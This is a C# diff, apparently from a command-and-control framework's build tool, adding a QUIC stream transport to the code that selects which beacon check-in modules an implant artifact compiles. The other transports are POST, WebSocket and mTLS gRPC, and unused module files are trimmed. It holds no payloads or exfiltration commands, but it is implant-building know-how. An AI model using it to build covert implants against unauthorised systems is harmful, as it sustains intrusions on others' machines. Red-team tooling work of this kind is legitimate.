@@ -15,12 +15,12 @@ public static class CheckInModes
 /// <summary>
 /// The check-in modules a build compiles in (architecture.md Sec 8): the
 /// envelope POST cycle for web-front entries on a poll-mode bake, the
-/// WebSocket stream for web-front entries on a stream-mode bake, and the
-/// mTLS gRPC stream for bare host:port entries. The egress walk the profile
-/// bakes decides the shapes and the baked mode picks the web client -- an
-/// artifact carries exactly the transports its walk and mode can dial, so a
-/// poll web build ships no WebSocket client and a stream web build ships no
-/// POST cycle.
+/// WebSocket stream for web-front entries on a stream-mode bake, the mTLS
+/// gRPC stream for bare host:port entries, and the QUIC stream for
+/// quic-schemed entries. The egress walk the profile bakes decides the
+/// shapes and the baked mode picks the web client -- an artifact carries
+/// exactly the transports its walk and mode can dial, so a poll web build
+/// ships no WebSocket client and a stream web build ships no POST cycle.
 /// </summary>
 [Flags]
 public enum CheckInModules
@@ -46,6 +46,13 @@ public enum CheckInModules
     /// bake -- the web posture's interactive tier.
     /// </summary>
     WebSocket = 4,
+
+    /// <summary>
+    /// The QUIC stream client (the implant's QuicBeacon): serves walk entries
+    /// whose beacon URL is quic-schemed -- the duplex socket family's live
+    /// session, whatever the baked mode.
+    /// </summary>
+    Quic = 8,
 }
 
 /// <summary>
@@ -54,9 +61,10 @@ public enum CheckInModules
 /// staging copy accordingly. The selection rule mirrors the implant's own
 /// run-time discriminator exactly -- a walk entry whose beacon URL is a
 /// schemed http(s) front runs the envelope POST cycle, a bare host:port runs
-/// the mTLS gRPC stream -- applied to every entry the profile bakes (the
-/// primary plus each fallback), so the compiled set is precisely the set of
-/// shapes the artifact can dial and never smaller.
+/// the mTLS gRPC stream, a quic-schemed URL runs the QUIC stream -- applied
+/// to every entry the profile bakes (the primary plus each fallback), so the
+/// compiled set is precisely the set of shapes the artifact can dial and
+/// never smaller.
 /// </summary>
 /// <remarks>
 /// The trim is whole source files: the unselected modules' files leave the
@@ -94,9 +102,17 @@ public static class TransportModuleSelection
         "Internal/WsBeacon.cs",
     };
 
+    // The QUIC stream module's whole source files (the client, its wire
+    // adapter, and the factory ride one file), relative to the implant tree
+    // root.
+    private static readonly string[] QuicModuleFiles =
+    {
+        "Internal/QuicCheckIn.cs",
+    };
+
     // The generated selection replaces this checked-in stub, relative to the
-    // implant tree root. The stub names both modules so the dev tree runs
-    // against either URL shape.
+    // implant tree root. The stub names every module so the dev tree runs
+    // against any URL shape.
     private const string SelectionFile = "Internal/TransportSelection.cs";
 
     /// <summary>
@@ -104,8 +120,8 @@ public static class TransportModuleSelection
     /// primary entry's beacon URL (the named beacon endpoint, else the one
     /// derived from the enroll endpoint -- the same value
     /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
-    /// fallback's derived URL, classified by the implant's own web-or-bare
-    /// rule, with the baked mode splitting the web shape -- stream dials the
+    /// fallback's derived URL, classified by the implant's own shape rules,
+    /// with the baked mode splitting the web shape -- stream dials the
     /// WebSocket beacon, poll runs the envelope POST cycle. A walk that can
     /// cross shapes (a stream primary with web fallbacks) keeps every client
     /// it can dial, so no bake ever strands the artifact on an entry it
@@ -123,6 +139,8 @@ public static class TransportModuleSelection
         {
             if (IsWebBeaconUrl(beaconUrl))
                 modules |= mode == CheckInModes.Stream ? CheckInModules.WebSocket : CheckInModules.Web;
+            else if (IsQuicBeaconUrl(beaconUrl))
+                modules |= CheckInModules.Quic;
             else
                 modules |= CheckInModules.Stream;
         }
@@ -165,6 +183,11 @@ public static class TransportModuleSelection
             foreach (var file in WebSocketModuleFiles)
                 File.Delete(Path.Combine(stagingDir, file));
         }
+        if ((modules & CheckInModules.Quic) == 0)
+        {
+            foreach (var file in QuicModuleFiles)
+                File.Delete(Path.Combine(stagingDir, file));
+        }
 
         File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
     }
@@ -184,6 +207,8 @@ public static class TransportModuleSelection
             factories.Add("        WsCheckIn.Create(setup),");
         if (NeedsGrpcClient(modules))
             factories.Add("        StreamCheckIn.Create(setup),");
+        if ((modules & CheckInModules.Quic) != 0)
+            factories.Add("        QuicCheckIn.Create(setup),");
         return
             "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
             + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
@@ -205,4 +230,10 @@ public static class TransportModuleSelection
     private static bool IsWebBeaconUrl(string beaconUrl)
         => beaconUrl.Trim().StartsWith("http://", StringComparison.OrdinalIgnoreCase)
            || beaconUrl.Trim().StartsWith("https://", StringComparison.OrdinalIgnoreCase);
+
+    // The implant's BeaconUrl.IsQuic, mirrored: a quic-schemed beacon URL is
+    // the QUIC stream's dial shape. Kept in textual lockstep with the
+    // implant's predicate -- the wire-side test pins both.
+    private static bool IsQuicBeaconUrl(string beaconUrl)
+        => beaconUrl.Trim().StartsWith("quic://", StringComparison.OrdinalIgnoreCase);
 }
